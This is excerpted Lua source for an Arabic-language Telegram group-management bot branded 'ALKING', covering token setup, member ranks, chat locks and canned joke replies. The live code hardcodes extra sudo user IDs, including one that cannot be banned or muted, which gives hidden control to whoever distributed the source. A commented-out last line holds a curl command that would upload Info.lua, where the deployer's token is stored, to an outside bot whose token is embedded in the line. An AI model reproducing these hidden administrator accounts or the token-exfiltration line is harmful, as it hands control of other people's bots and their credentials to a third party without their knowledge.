...
if res ~= 200 then
print('\27[0;31m≪━━━━━━ 𝐀𝑳𝐊𝐈𝐍𝐆━━━━━━≫\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na≪━━━━━━  𝐀𝑳𝐊𝐈𝐍𝐆━━━━━━≫\n27[0;39;49m')
database:set(id_server..":token",token)
end 
else
print('\27[0;35m≪━━━━━━ 𝐀𝑳𝐊𝐈𝐍𝐆━━━━━━≫ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
sudo_users = {SUDO,1208165035,1362402940,40}   
...
var = true  
elseif tonumber(user_id) == tonumber(40) then
var = true  
...
local UserName = (data.username_ or "alking_1234")
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼  𝐀𝑳𝐊𝐈𝐍𝐆")  
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[DEV](t.me/ramadan12344)

]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'DEV', url="t.me/ramadan12344"}}, 
} 
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس️️', url="t.me/alking_1234"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == '≪━━━━━━ 𝐀𝑳𝐊𝐈𝐍𝐆━━━━━━≫' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/alking_1234)
]] 
...
usertext = '\n ⌯ العضو » ['..result.title_..'](t.me/'..(username or 'alking_1234')..')'
status  = '\n ⌯ تم ترقيته مطور'
...
usertext = '\n ⌯ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'alking_1234')..')'
status  = '\n ⌯ تم ترقيته مطور'
...
if DRAGON1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⌯ العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'alking_1234')..') \n ⌯ '..DRAGON1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
send(msg.chat_id_,0," ⌯ العضو : {["..data.first_name_.."](T.ME/alking_1234)}\n ⌯ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ⌯ عذرا » {["..data.first_name_.."](T.ME/alking_1234)}\n ⌯ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' 𝐀𝑳𝐊𝐈𝐍𝐆',url="t.me/ramadan12344"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'ماديسون' or text == 'المبرمج ماديسون' then
local msg_id = msg.id_/2097152/0.5
local Text = [[
...
if text == 'كينج' or text == 'الكينج' or text == 'مبرمج السورس' then
local msg_id = msg.id_/2097152/0.5
local Text = [[
للتواصل مع الكينج مبرمج السورس
اتبع الزر إلى تحت ⬇️
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text = '  ⌯ K I N G ⌯  ',url="t.me/ramadan12344"}},}
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/ramadan12344&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ⌯ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'alking_1234')..') \n ⌯ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⌯ بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'alking_1234')..') \n ⌯ تـم قفـل التاك بالكتم ')
end,nil)   
...
if result.sender_user_id_ == tonumber(40) then
send(msg.chat_id_, msg.id_, " ⌯ لا يمكنك حظر المبرمج ماديسون عام\n")
return false 
end
...
if result.sender_user_id_ == tonumber(40) then
send(msg.chat_id_, msg.id_, " ⌯ لا يمكنك كتم المبرمج ماديسون عام\n")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ⌯ لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'alking_1234')..')'
status  = '\n ⌯ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ⌯ العضو » '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ⌯ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'alking_1234')..')'
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ⌯ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'alking_1234')..')'..'\n ⌯ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
database:set(bot_id.."alking_1234:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,'⌯ تم تفعيل الانستا')
database:set(bot_id.."alking_1234:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."alking_1234:insta_bot"..msg.chat_id_) == "open" then
...
database:set(bot_id.."alking_1234:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"⌯تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."alking_1234:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."alking_1234:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
send(msg.chat_id_,msg.id_, '[انت مطوري نور عنيا🥺🤍](t.me/alking_1234)') 
return false
end

if text == 'انا مين' and DevSoFi(msg) then 
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/alking_1234)') 
return false
end

if text == 'انا مين' and Sudo(msg) then 
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/alking_1234)') 
return false
end

if text == 'انا مين' and CoSu(msg) then 
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/alking_1234)') 
return false
end

if text == 'انا مين' and Constructor(msg) then 
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/alking_1234)') 
return false
end

if text == 'انا مين' and BasicConstructor(msg) then 
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂⌯](t.me/alking_1234)') 
return false
end

if text == 'انا مين' and Manager(msg) then 
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/alking_1234)') 
return false
end

if text == 'انا مين' and Mod(msg) then 
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/alking_1234)') 
return false
end

if text == 'انا مين' and Special(msg) then 
send(msg.chat_id_,msg.id_, '[ انت مميز يروحي 🌚❤️ ](t.me/alking_1234)') 
return false
end

if text == 'انا مين' then
send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/alking_1234)') 
return false
end
...
if text == 'سلام' then 
send(msg.chat_id_,msg.id_, '[ابق تعاله كليوم..😹💔🎶](t.me/alking_1234)') 
return false
end

if text == 'هاي' or text == 'هيي' then
send(msg.chat_id_,msg.id_, '[علي الواي فاي..😺💜](t.me/alking_1234)') 
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/alking_1234)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/alking_1234)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[لف وارجعع تانيي مشحوار😹💃❤️](t.me/alking_1234)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[نزل عينك عيب كده..🌚♥️](t.me/alking_1234)') 
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[يحلات عيونك..♥️🦋](t.me/alking_1234)')
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عايز من ده..💋🥀](t.me/alking_1234)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بف..🙄💔](t.me/alking_1234)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[متزعلش بحبك..😥♥️](t.me/alking_1234)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وانا كمان بحبك .🥺❤️](t.me/alking_1234)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم ب ف ..🙄💔](t.me/alking_1234)')
return false
end
end
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'alking_1234')..')'
local iduser = result.sender_user_id_
...
--local curl = 'curl "'..'https://api.telegram.org/bot1704828705:AAGxtUPVSoztF7BAJkKjzW05XD21mCh-kdI/sendDocument'..'" -F "chat_id='.. 40 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
------------------------------------------------------------------------
